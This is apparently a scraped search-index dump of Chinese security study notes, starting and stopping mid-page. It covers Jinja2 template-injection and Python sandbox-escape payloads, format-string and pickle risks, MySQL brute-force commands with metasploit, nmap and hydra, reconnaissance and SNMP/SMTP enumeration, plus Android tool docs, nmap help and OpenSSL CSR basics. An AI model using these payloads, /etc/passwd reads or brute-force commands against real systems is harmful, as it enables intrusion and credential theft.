模板注入：{{9-6}}，在括号内的内容会被当作Python模板被执行  @app.route(\u0026#34;/\u0026#34;) def index(): name = request.args.get(\u0026#39;name\u0026#39;, \u0026#39;guest\u0026#39;) t = Template(\u0026#39;Hello\u0026#39;, name) return t.render()  利用jinjia2语法执行命令：  {% for c in [].__class__.__base__.__subclass__() %} {% if c.__name__ == \u0026#39;catch_warnings\u0026#39; %} {% for b in c.__init__.globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if \u0026#39;eval\u0026#39; in b.keys() %} {{ b[\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;id\u0026#34;).read()\u0026#39;) }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} [].__class__.__base__.subclasses__()[60].__init__.__globals__.values()[13][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;id\u0026#34;).read()\u0026#39;)   服务器端模板注入相当于控制了对方的view层，可以获得一切jinja2中可以获取的数据。但此时我们仍然在jinja2的沙箱中，接下来我们需要绕过沙箱。\n  Python沙箱逃逸 #   沙箱一般是限制指定函数的运行，或者对指定模块的删除以及过滤  任意代码执行 #   一些任意代码执行以及文件读取的函数  os执行系统命令：os.system('ipconfig') exec任意代码执行：exec('__import__(\u0026quot;os\u0026quot;).system(\u0026quot;ipconfig\u0026quot;)') eval任意代码执行：eval('__import__(\u0026quot;os\u0026quot;).system(\u0026quot;ipconfig\u0026quot;)') timeit → 本是检测本机性能的，也可以任意代码执行：timeit.timeit(\u0026quot;__import__('os').system('ipconfig')\u0026quot;, number=1) platform：platform.popen('ipconfig').read() subprocess：subprocess.Popen('ipconfig', shell=True, stdout=subprocess.PIPE, stderr=subprocess) file：file('/etc/passwd').read() open：open('/etc/passwd').read() codecs：codecs.open('/etc/passwd').read()    其他攻击方法 #   PS：Bypass明文过滤源码  import re pattern = re.complile(\u0026#39;(os|commands|subprocess|sys)\u0026#39;) while True: code = raw_input(\u0026#39;\u0026#39;) match = re.search(pattern, code) if match: print(\u0026#34;forbidden module import detected.\u0026#34;) else: print(\u0026#34;Succ!\u0026#34;)  base64编码方式逃逸（只适用于Python2）。例子：  __buildins__.__dict__[\u0026#39;X19pbXBvcnRfXw==\u0026#39;.decode(\u0026#39;base64\u0026#39;)](\u0026#39;b3M=\u0026#39;.decode(\u0026#39;base64\u0026#39;)) # 等价于 __buildins__.__dict__[\u0026#39;__import__\u0026#39;](os)   格式化字符串问题。\n 在以下代码中，如果用户输入%(password)s 就可以获得用户的真实密码了。  userdata = {\u0026#34;user\u0026#34;:\u0026#34;jdoe\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;secrect\u0026#34;} passwd = raw_input(\u0026#34;Password:\u0026#34;) if passwd != userdata[\u0026#34;password\u0026#34;]: print(\u0026#34;Password \u0026#34;+ passwd + \u0026#34; is wrong for user %(user)s\u0026#34;)\t%userdata 在以下代码中可以通过{event.__init__.__globals__[CONFIG][SECRET_KEY]} 就可以泄露敏感信息。  CONFIG = { \u0026#39;SECRET_KEY\u0026#39;: \u0026#39;super secret key\u0026#39; } class Event(object): def __init__(self, id, level, message): self.id = id self.level = level self.message = message def format_event(format_string, event): return format_string.format(event=event)   使用del过滤防御 #  del __builtins__.__dict__[\u0026#39;__import__\u0026#39;] del __builtins__.__dict__[\u0026#39;eval\u0026#39;] del __builtins__.__dict__[\u0026#39;execfile\u0026#39;] del __builtins__.__dict__[\u0026#39;input\u0026#39;] # 因为可以绕过del过滤：reload(__buildtins__)，解决办法： del __builtins__.__dict__[\u0026#39;reload\u0026#39;] 反序列化 #    pickle.dump(obj, file[,protocol]) → 序列化对象，并将结果数据写入到文件对象中（protocol是序列化模式，默认值为0以文本的形式序列化）\n  pickle.load(file) → 反序列化对象，将文件中的数据解析成为一个Python对象。\n  pickle的典型应用场景：\n 通常在解析认证token、session的时候； 可能将对象Pickle后存储成磁盘文件； 可能将对象Pickle后在网络中传输； 可能参数传递给程序，比如一个sqlmap代码执行漏洞。    内网渗透 #   预交互、情报搜集、威胁建模、脆弱点分析、漏洞利用、后漏洞利用、撰写报告  扫描网络 #   被动信息扫描 → 开源情报（OSINT）  信息收集框架：Recon-ng、Discover、SpiderFoot、Gitrob-Github   端口扫描：Nmap、Zmap、Masccan 漏洞扫描：Cobalstrike、Tenable Nessus、Rapid7 Nexpose、OpenVas、Metasploit、Nmap scripts、巡风（偏内网资产审计） 漏洞利用：metasploit、meterpreter 添加路由：route add/remove subnet_addr  域渗透 #   工作组、家庭组 P.S.：信息安全四大顶会，RSAP  "},{"id":42,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/android/adb/","title":"Adb","section":"android","content":"Android Debug Bridge(ADB) #  Android Debug Bridge (adb) is a versatile command-line tool that lets you communicate with a device.\nIt is a client-server program that includes three components:\n A client, which sends commands. The client runs on your development machine. You can invoke a client from a command-line terminal by issuing an adbcommand. A daemon (adbd), which runs commands on a device. The daemon runs as a background process on each device. A server, which manages communication between the client and the daemon. The server runs as a background process on your development machine.  How does adb works #  客户端：\n 启动一个 adb 客户端时，此客户端首先检查是否有已运行的 adb 服务器进程。 如果没有，它将启动服务器进程。当服务器启动时，它与本地 TCP 端口 5037 绑定，并侦听从 adb 客户端发送的命令—所有 adb 客户端均使用端口 5037 与 adb 服务器通信。  服务端：\n  它通过扫描 5555 到 5585 之间（模拟器/设备使用的范围）的奇数号端口查找模拟器/设备实例。服务器一旦发现 adb 后台程序，它将设置与该端口的连接。\n  请注意，每个模拟器/设备实例将获取一对端口——用于控制台连接的偶数号端口、用于 adb 连接的奇数号端口。例如：\nEmulator 1, console: 5554\rEmulator 1, adb: 5555\rEmulator 2, console: 5556\rEmulator 2, adb: 5557\rand so on...\r  当服务器已设置与所有模拟器实例的连接后，您可以使用 adb 命令访问这些实例。\nEnable adb debugging on your device #  To use adb with a device connected over USB, you must enable USB debugging in the device system settings, under Developer options.\nYou can now connect your device with USB. You can verify that your device is connected by executing adb devices from the android_sdk/platform-tools/directory. If connected, you\u0026rsquo;ll see the device name listed as a \u0026ldquo;device.\u0026rdquo;\n# see list of connected devices $ adb devices For more information about connecting to a device over USB, read Run Apps on a Hardware Device.\nConnect to a device over WiFi #  暂时不需要\nQuery for devices #  You can generate a list of attached devices using thedevices command.\n$ adb devices -l In response, adb prints this status information for each device:\n Serial number: A string created by adb to uniquely identify the device by its port number. Here\u0026rsquo;s an example serial number: emulator-5554 State: The connection state of the device can be one of the following:  offline: The device is not connected to adb or is not responding. device: The device is now connected to the adb server. Note that this state does not imply that the Android system is fully booted and operational because the device connects to adb while the system is still booting. However, after boot-up, this is the normal operational state of an device. no device: There is no device connected.   Description: If you include the -l option, the devices command tells you what the device is. This information is helpful when you have multiple devices connected so that you can tell them apart.  Emulator not listed #  his happens when all of the following conditions are true:\n The adb server is not running, and You use the emulator command with the -port or -ports option with an odd-numbered port value between 5554 and 5584, and The odd-numbered port you chose is not busy so the port connection can be made at the specified port number, or if it is busy, the emulator switches to another port that meets the requirements in 2, and You start the adb server after you start the emulator.  One way to avoid this situation is to let the emulator choose its own ports, and don\u0026rsquo;t run more than 16 emulators at once.\nExample:\n$ adb kill-server $ emulator -avd Nexus_6_API_25 -port 5555 $ adb devices List of devices attached * daemon not running. starting it now on port 5037 * * daemon started successfully * Send commands to a specific device #  如果多个模拟器/设备实例正在运行，在发出 adb 命令时您必须指定一个目标实例。为此，请在命令中使用 -s 选项。以下是 -s 选项的用法：\n$ adb -s \u0026lt;serial_number\u0026gt; \u0026lt;command\u0026gt; 如上所示，您使用由 adb 分配的序列号为命令指定目标实例。您可使用 devices命令获取正在运行的模拟器/设备实例的序列号。例如：\n$ adb -s emulator-5556 install helloWorld.apk 注意，如果在多个设备可用时您未指定目标模拟器/设备实例就发出命令，那么 adb 将生成一个错误。\n另外：\n 如果您有多个设备可用（硬件或模拟设备），但只有一个设备是模拟器，则使用 -e选项将命令发送至该模拟器。 同样，如果有多个设备，但只连接了一个硬件设备，则使用 -d 选项将命令发送至该硬件设备。  Install an app #  You can use adb to install an APK on an emulator or connected device with the install command:\n$ adb install path_to_apk You must use the -t option with the install command when you install a test APK. For more information, see -t.\nSet up port forwarding #  You can use the forward command to set up arbitrary port forwarding, which forwards requests on a specific host port to a different port on a device. The following example sets up forwarding of host port 6100 to device port 7100:\n$ adb forward tcp:6100 tcp:7100 Copy files to/from a device #  Use the pull and push commands to copy files to and from an device. Unlike the install command, which only copies an APK file to a specific location, the pulland push commands let you copy arbitrary directories and files to any location in a device.\nTo copy a file or directory and its sub-directories from the device, do the following:\n$ adb pull remote local To copy a file or directory and its sub-directories to the device, do the following:\n$ adb push local remote Replace local and remote with the paths to the target files/directory on your development machine (local) and on the device (remote). For example:\n$ adb push foo.txt /sdcard/foo.txt Stop the adb server #  In some cases, you might need to terminate the adb server process and then restart it to resolve the problem (e.g., if adb does not respond to a command).\nTo stop the adb server, use the adb kill-server command. You can then restart the server by issuing any other adb command.\n$ adb kill-server adb commands reference #  see: https://developer.android.com/studio/command-line/adb\n"},{"id":43,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/android/apksigner/","title":"Apksigner","section":"android","content":" 学习途径：\n 官方命令行工具：https://developer.android.com/studio/command-line/apksigner   apksigner #  Usage #  sign an apk #  The syntax for signing an APK using the apksigner tool is as follows:\n$ apksigner sign --ks keystore.jks [signer_options] app-name.apk # or $ apksigner sign --key key.pk8 --cert cert.x509.pem [signer_options] app-name.apk When you sign an APK using the apksigner tool, you must provide the signer\u0026rsquo;s private key and certificate. You can include this information in two different ways:\n Specify a Key Store file using the --ks option. Specify the private key file and certificate file separately using the --key and --cert options, respectively. The private key file must use the PKCS #8 format, and the certificate file must use the X.509 format.  Usually, you sign an APK using only one signer. In the event that you need to sign an APK using multiple signers, use the --next-signer option to separate the set of general options to apply to each signer:\n$ apksigner sign [signer_1_options] --next-signer [signer_2_options] app-name.apk verify the signature of an apk #  The syntax for confirming that an APK\u0026rsquo;s signature will be verified successfully on supported platforms is as follows:\n$ apksigner verify [options] app-name.apk Rotate signing keys #  The syntax for rotating a signing certificate lineage, or a new sequence of signatures, is as follows:\n$ apksigner rotate --in /path/to/existing/lineage \\  --out /path/to/new/file \\  --old-signer --ks old-signer-jks \\  --new-signer --ks new-signer-jks Example #  Sign an APK #  Sign an APK using release.jks, which is the only key in the KeyStore:\n$ apksigner sign --ks release.jks app.apk Sign an APK using a private key and certificate, stored as separate files:\n$ apksigner sign --key release.pk8 --cert release.x509.pem app.apk Sign an APK using two keys:\n$ apksigner sign --ks first-release-key.jks --next-signer --ks second-release-key.jks app.apk Verify the signature of an APK #  Check whether the APK\u0026rsquo;s signatures are expected to be confirmed as valid on all Android platforms that the APK supports:\n$ apksigner verify app.apk Check whether the APK\u0026rsquo;s signatures are expected to be confirmed as valid on Android 4.0.3 (API level 15) and higher:\n$ apksigner verify --min-sdk-version 15 app.apk Rotate signing keys #  Enable a signing certificate lineage that supports key rotation:\n$ apksigner rotate --out /path/to/new/file --old-signer \\  --ks release.jks --new-signer --ks release2.jks Rotate your signing keys again:\n$ apksigner rotate --in /path/to/existing/lineage \\  --out /path/to/new/file --old-signer --ks release2.jks \\  --new-signer --ks release3.jks "},{"id":44,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/android/apktool/","title":"Apktool","section":"android","content":" s学习途径：\n 官网教程：https://ibotpeaches.github.io/Apktool/   apktool #  Basic #  First lets take a lesson into apk files. Apks are nothing more than a zip file containing resources and assembled java code. If you were to simply unzip an apk like so, you would be left with files such as classes.dex and resources.arsc.\n$ unzip testapp.apk -d unzip-folder ... $ cd unzip-folder $ ls AndroidManifest.xml META-INF classes.dex res resources.arsc Obviously, editing or viewing a compiled file is next to impossible. That is where Apktool comes into play:\n$ apktool d testapp.apk I: Using Apktool 2.3.4 on testapp.apk ... Decoding #  The decode option on Apktool can be invoked either from d or decode like shown below.\n$ apktool d foo.jar # decodes foo.jar to foo.jar.out folder $ apktool decode foo.jar # decodes foo.jar to foo.jar.out folder $ apktool d bar.apk # decodes bar.apk to bar folder $ apktool decode bar.apk # decodes bar.apk to bar folder $ apktool d bar.apk -o baz # decodes bar.apk to baz folder Building #  The build option can be invoked either from b or build like shown below\n$ apktool b foo.jar.out # builds foo.jar.out folder into foo.jar.out/dist/foo.jar file $ apktool build foo.jar.out # builds foo.jar.out folder into foo.jar.out/dist/foo.jar file $ apktool b bar # builds bar folder into bar/dist/bar.apk file $ apktool b . # builds current directory into ./dist $ apktool b bar -o new_bar.apk # builds bar folder into new_bar.apk $ apktool b bar.apk # WRONG: brut.androlib.AndrolibException: brut.directory.PathNotExist: apktool.yml # Must use folder, not apk/jar file Frameworks #  Frameworks can be installed either from if or install-framework, in addition two parameters\n  -p, --frame-path \u0026lt;dir\u0026gt; - Store framework files into \u0026lt;dir\u0026gt;\n  -t, --tag \u0026lt;tag\u0026gt; - Tag frameworks using \u0026lt;tag\u0026gt;\n  -t, --tag \u0026lt;tag\u0026gt; - Tag frameworks using \u0026lt;tag\u0026gt;\n  Allow for a finer control over how the files are named and how they are stored.\n$ apktool if framework-res.apk I: Framework installed to: 1.apk # pkgId of framework-res.apk determines number (which is 0x01) $ apktool if com.htc.resources.apk I: Framework installed to: 2.apk # pkgId of com.htc.resources is 0x02 $ apktool if com.htc.resources.apk -t htc I: Framework installed to: 2-htc.apk # pkgId-tag.apk $ apktool if framework-res.apk -p foo/bar I: Framework installed to: foo/bar/1.apk $ apktool if framework-res.apk -t baz -p foo/bar I: Framework installed to: foo/bar/1-baz.ap "},{"id":45,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/gdb/gdb%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/","title":"Gdb自学笔记","section":"gdb","content":"自学笔记 (pdf) #   "},{"id":46,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/gdb/peda/","title":"Peda","section":"gdb","content":" 源项目地址：https://github.com/longld/peda\n PEDA #  PEDA - Python Exploit Development Assistance for GDB\n安装教程 #  使用以下命令安装：\n$ git clone https://github.com/longld/peda $ echo \u0026#34;souce `pwd`/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit 使用教程 #  这个插件将会在开启 gdb 之后注入一些命令，以下是一些常用命令：\n   命令 功能     aslr 检测程序地址随机化是否开启/设置地址随机化   checksec 检测程序开启的安全保护   dumpargs 显示执行程序是的命令行参数   elfheader/readelf 检测 ELF 文件的文件头信息   elfsymbol 显示文件中包含的所有非调式信息   lookup 查找一个给定地址范围内中，所有被引用的信息   patch 在一段地址之前通过 字符串/十六进制/整数 的方式，添加一段数据   pattern 在内存中，生成/查找/写入 一个循环模式   procinfo 显示从 /proc/pid 中得到的信息   pshow/pset 显示/设置 peda 的属性参数   ropgadget/ropsearch 显示所有的 ROP 链/查找给定的 ROP 链   searchmem/find 在二进制文件中，查找一个指定的正则表达式   shellcode 生成或下载常用的 shellcode   xormem 对一段给定的地址范围进行异或操作    "},{"id":47,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/kali/mysql%E7%88%86%E7%A0%B4/","title":"Mysql爆破","section":"kali","content":" ​\t学习地址：\n https://xz.aliyun.com/t/1652   MYSQL 爆破 #  使用 metasploit #  启动 metasploit：\n$ msfconsole 使用 auxiliary/scanner/mysql/mysql_login 模块进行：\n可以单一扫描验证登录验证：\nuse auxiliary/scanner/mysql/mysql_login set rhosts \u0026lt;ip-address\u0026gt; set username root set password 11111111 run 使用某个字典进行爆破：\nuse auxiliary/scanner/mysql/mysql_login set RHOSTS \u0026lt;ip-address\u0026gt; set pass_file “/root/top10000pwd.txt” set username root run nmap 扫描 #  可以查看所有与 mysql 相关的脚本：\n$ ls -al /usr/share/nmap/scripts/mysql* 先查看是否开启了端口\n$ nmap \u0026lt;ip-address\u0026gt; 扫描空口令：\n$ nmap -p3306 --script=mysql-empty-password.nse 192.168.137.130 扫描已知口令：\n$ nmap -sV --script=mysql-databases --script-args dbuser=root,dbpass=11111111 192.168.195.130 xHydra 和 Hydras #  使用字典进行爆破：\n$ hydra -l root -P /root/Desktop/top10000pwd.txt -t 16 192.168.157.130 mysql "},{"id":48,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/kali/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"信息收集","section":"kali","content":" 学习途径：\n https://bbs.pediy.com/thread-215178.htm   信息收集 #   到最后还是 nmap 最好用。\n DNS 域名解析 #  解析一个域名的 IP 地址：\n$ host www.example.com 或者使用以下的方式详细列举包括 DNS 服务器的信息：\n$ nslookup www.example.com 使用以下命令列举 DNS 请求的详细信息：\n$ dig www.example.com 枚举子域名：\n$ dnsmap example.com 服务枚举 #  我们将要研究 DNS 枚举和 SNMP 枚举技术。\nDNS 枚举 #  DNS 枚举是定位某个组织的所有 DNS 服务器和 DNS 条目的过程。DNS 枚举允许我们收集有关该组织的重要信息，例如用户名、计算机名称、IP 地址以及其它。为了完成这些任务我们会使用 DNSenum。\n我们可以使用以下的命令进行 DNS 枚举：\n$ dnsenum --enum \u0026lt;domain-name\u0026gt; 我们可以使用一些额外的选项来运行 DNSenum，它们包括这些东西：\n --threads [number] 允许你设置一次所运行的线程数量。 -r 允许你开启递归查找。 -d 允许你设置在 WHOIS 请求之间的时间延迟，单位为秒。 -o 允许我们制定输出位置。 -w 允许我们开启 WHOIS 查询。  还可以使用 fierce （一个尝试多种技术来寻找所有目标所用的 IP 地址和域名的工具）进行域名扫描：\n$ fierce -dns \u0026lt;domain-adddress\u0026gt; 为了以指定的词语列表进行相同的操作，键入以下命令：\n$ fierce -dns \u0026lt;domain-address\u0026gt; -wordlist hosts.txt -file /tmp/output.txt SNMP 枚举 #  对于 SNMP 枚举，我们会使用叫做 SnmpEnum 的工具，它是一个强大的 SNMP 枚举工具，允许我们分析网络上的 SNMP 流量。\nSnmpwalk 是一个使用 SNMP GETNEXT 请求在网络实体中查询信息树的 SNMP 应用。在命令行中键入下列命令：\n$ snmpwalk -c public \u0026lt;ip-address\u0026gt; -v 2c 我们亦可以枚举安装的软件：\n$ snmpwalk -c public \u0026lt;ip-address\u0026gt; -v 1 | grep hrSWInstalledName 或者枚举开放的 TCP 端口：\n$ snmpwalk -c public 192.168.10.200 -v 1 | grep tcpConnState | cut -d\u0026#34;.\u0026#34; -f6 | sort –nu 另一个通过 SNMP 收集信息的工具叫做 snmpcheck：\n$ snmpcheck -t \u0026lt;ip-address\u0026gt; SMTP 用户枚举 #  可以在 SMTP 服务器上启动用户的 SMTP 枚举：\n$ smtp-user-enum -M VRFY -U /tmp/users.txt -t \u0026lt;address\u0026gt; 网络范围 #  $ dmitry -wnspb targethost.com -o /root/Desktop/dmitry-result 键入以下命令来执行 ICMP netmask 请求：\n$ netmask -s targethost.com 使用 scapy，我们就可以执行并行路由跟踪。键入以下命令来启动它：\n$ scapy 现在可以输入以下函数：\nans,unans=sr(IP(dst=\u0026quot;www.targethost.com/30\u0026quot;, ttl=(1,6))/TCP()\r可以输入以下函数来将结果展示为表格：\nans.make_table( lambda (s,r): (s.dst, s.ttl, r.src) ) IP 反查 #  $ nmap --script hostmap-ip2hosts \u0026lt;ip-address\u0026gt; 或使用以下命令反查某个端口上的 IP 地址：\n$ nmap --script hostmap-ip2hosts \u0026lt;ip-address\u0026gt; -p\u0026lt;port\u0026gt; WAF 检测 #  $ wafw00f \u0026lt;target-address\u0026gt; "},{"id":49,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/kali/%E6%BC%8F%E6%B4%9E%E8%AF%84%E4%BC%B0/","title":"漏洞评估","section":"kali","content":"漏洞评估 #  Nessus #  使用 Nessus 这个工具，使用教程：https://cloud.tencent.com/developer/article/1076409\n发现本地漏洞 #  发现网络漏洞 #   在 Policies → Add → Web Application 中选择 Web Application Tests 新建一个自己的 Policies。 在 My Scan → New Scan 中通过之前定义的 Policies 定义一个新的 Scan 在 My Scan 界面启动新的 Scan  OpenVAS #  OpenVAS，即开放漏洞评估系统，是一个用于评估目标漏洞的杰出框架。它是 Nessus 项目的分支。不像 Nessus，OpenVAS提供了完全免费的版本。由于 OpenVAS 在Kali Linux中成为标准，我们将会以配置开始。\n"},{"id":50,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/nmap/frag/","title":"Frag","section":"nmap","content":"零碎的用处 #  扫描局域网 #  $ nmap -sP 192.168.0.0/16 "},{"id":51,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/nmap/manual/","title":"Manual","section":"nmap","content":"manual #  Nmap 7.80 ( https://nmap.org ) Usage: nmap [Scan Type(s)] [Options] {target specification} TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL \u0026lt;inputfilename\u0026gt;: Input from list of hosts/networks -iR \u0026lt;num hosts\u0026gt;: Choose random targets --exclude \u0026lt;host1[,host2][,host3],...\u0026gt;: Exclude hosts/networks --excludefile \u0026lt;exclude_file\u0026gt;: Exclude list from file HOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers \u0026lt;serv1[,serv2],...\u0026gt;: Specify custom DNS servers --system-dns: Use OS's DNS resolver --traceroute: Trace hop path to each host SCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags \u0026lt;flags\u0026gt;: Customize TCP scan flags -sI \u0026lt;zombie host[:probeport]\u0026gt;: Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans -sO: IP protocol scan -b \u0026lt;FTP relay host\u0026gt;: FTP bounce scan PORT SPECIFICATION AND SCAN ORDER: -p \u0026lt;port ranges\u0026gt;: Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 --exclude-ports \u0026lt;port ranges\u0026gt;: Exclude the specified ports from scanning -F: Fast mode - Scan fewer ports than the default scan -r: Scan ports consecutively - don't randomize --top-ports \u0026lt;number\u0026gt;: Scan \u0026lt;number\u0026gt; most common ports --port-ratio \u0026lt;ratio\u0026gt;: Scan ports more common than \u0026lt;ratio\u0026gt; SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity \u0026lt;level\u0026gt;: Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-trace: Show detailed version scan activity (for debugging) SCRIPT SCAN: -sC: equivalent to --script=default --script=\u0026lt;Lua scripts\u0026gt;: \u0026lt;Lua scripts\u0026gt; is a comma separated list of directories, script-files or script-categories --script-args=\u0026lt;n1=v1,[n2=v2,...]\u0026gt;: provide arguments to scripts --script-args-file=filename: provide NSE script args in a file --script-trace: Show all data sent and received --script-updatedb: Update the script database. --script-help=\u0026lt;Lua scripts\u0026gt;: Show help about scripts. \u0026lt;Lua scripts\u0026gt; is a comma-separated list of script-files or script-categories. OS DETECTION: -O: Enable OS detection --osscan-limit: Limit OS detection to promising targets --osscan-guess: Guess OS more aggressively TIMING AND PERFORMANCE: Options which take \u0026lt;time\u0026gt; are in seconds, or append 'ms' (milliseconds), 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m). -T\u0026lt;0-5\u0026gt;: Set timing template (higher is faster) --min-hostgroup/max-hostgroup \u0026lt;size\u0026gt;: Parallel host scan group sizes --min-parallelism/max-parallelism \u0026lt;numprobes\u0026gt;: Probe parallelization --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout \u0026lt;time\u0026gt;: Specifies probe round trip time. --max-retries \u0026lt;tries\u0026gt;: Caps number of port scan probe retransmissions. --host-timeout \u0026lt;time\u0026gt;: Give up on target after this long --scan-delay/--max-scan-delay \u0026lt;time\u0026gt;: Adjust delay between probes --min-rate \u0026lt;number\u0026gt;: Send packets no slower than \u0026lt;number\u0026gt; per second --max-rate \u0026lt;number\u0026gt;: Send packets no faster than \u0026lt;number\u0026gt; per second FIREWALL/IDS EVASION AND SPOOFING: -f; --mtu \u0026lt;val\u0026gt;: fragment packets (optionally w/given MTU) -D \u0026lt;decoy1,decoy2[,ME],...\u0026gt;: Cloak a scan with decoys -S \u0026lt;IP_Address\u0026gt;: Spoof source address -e \u0026lt;iface\u0026gt;: Use specified interface -g/--source-port \u0026lt;portnum\u0026gt;: Use given port number --proxies \u0026lt;url1,[url2],...\u0026gt;: Relay connections through HTTP/SOCKS4 proxies --data \u0026lt;hex string\u0026gt;: Append a custom payload to sent packets --data-string \u0026lt;string\u0026gt;: Append a custom ASCII string to sent packets --data-length \u0026lt;num\u0026gt;: Append random data to sent packets --ip-options \u0026lt;options\u0026gt;: Send packets with specified ip options --ttl \u0026lt;val\u0026gt;: Set IP time-to-live field --spoof-mac \u0026lt;mac address/prefix/vendor name\u0026gt;: Spoof your MAC address --badsum: Send packets with a bogus TCP/UDP/SCTP checksum OUTPUT: -oN/-oX/-oS/-oG \u0026lt;file\u0026gt;: Output scan in normal, XML, s|\u0026lt;rIpt kIddi3, and Grepable format, respectively, to the given filename. -oA \u0026lt;basename\u0026gt;: Output in the three major formats at once -v: Increase verbosity level (use -vv or more for greater effect) -d: Increase debugging level (use -dd or more for greater effect) --reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports --packet-trace: Show all packets sent and received --iflist: Print host interfaces and routes (for debugging) --append-output: Append to rather than clobber specified output files --resume \u0026lt;filename\u0026gt;: Resume an aborted scan --stylesheet \u0026lt;path/URL\u0026gt;: XSL stylesheet to transform XML output to HTML --webxml: Reference stylesheet from Nmap.Org for more portable XML --no-stylesheet: Prevent associating of XSL stylesheet w/XML output MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute --datadir \u0026lt;dirname\u0026gt;: Specify custom Nmap data file location --send-eth/--send-ip: Send using raw ethernet frames or IP packets --privileged: Assume that the user is fully privileged --unprivileged: Assume the user lacks raw socket privileges -V: Print version number -h: Print this help summary page. EXAMPLES: nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.0/16 10.0.0.0/8 nmap -v -iR 10000 -Pn -p 80 SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES "},{"id":52,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/openssl/1.aboutcsr/","title":"1. About Csr","section":"openssl","content":"About Certificate Signing Requests (CSRs) #  graph TB;\rsubgraph Client;\rF{Infomation};\rPK1(\u0026quot;PrivateKey(*.key)\u0026quot;); PK2(\u0026quot;PublicKey(*.pub)\u0026quot;); DN(\u0026quot;DistinguisedName(DN)\u0026quot;)\rCSR(\u0026quot;CertificateSigningRequest(*.csr)\u0026quot;)\rF---PK1; F---PK2; F---DN;\rPK2--\u0026gt;CSR; DN--\u0026gt;CSR\rCRTclient(\u0026quot;ClientCertificate(*.crt)\u0026quot;)\rend\rsubgraph CAroot;\rCRTroot(\u0026quot;CACertificate(*.crt)\u0026quot;)\rend\rCSR--\u0026gt;|request|CRTroot\rCRTroot--\u0026gt;|sign|CRTclient\rIf you would like to obtain an SSL certificate from a certificate authority (CA), you must generate a certificate signing request (CSR). A CSR consists mainly of the public key of a key pair, and some additional information.\nWhenever you generate a CSR, you will be prompted to provide information regarding the certificate. This information is known as a Distinguised Name (DN). An important field in the DN is the Common Name(CN), which should be the exact Fully Qualified Domain Name (FQDN) of the host that you intend to use the certificate with. It is also possible to skip the interactive prompts when creating a CSR by passing the information via command line or from a file.\nHere is an example of what the CSR information prompt will look like:\n--- Country Name (2 letter code) [AU]:US State or Province Name (full name) [Some-State]:New York Locality Name (eg, city) []:Brooklyn Organization Name (eg, company) [Internet Widgits Pty Ltd]:Example Brooklyn Company Organizational Unit Name (eg, section) []:Technology Division Common Name (e.g. server FQDN or YOUR name) []:examplebrooklyn.com Email Address []: If you want to non-interactively answer the CSR information prompt, you can do so by adding the -subjoption to any OpenSSL commands that request CSR information. Here is an example of the option, using the same information displayed in the code block above:\n-subj \u0026#34;/C=US/ST=New York/L=Brooklyn/O=Example Brooklyn Company/CN=examplebrooklyn.com\u0026#34; "},{"id":53,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/openssl/2.generatecsr/","title":"2. Generate Csr","section":"openssl","content":"Generating CSRs # 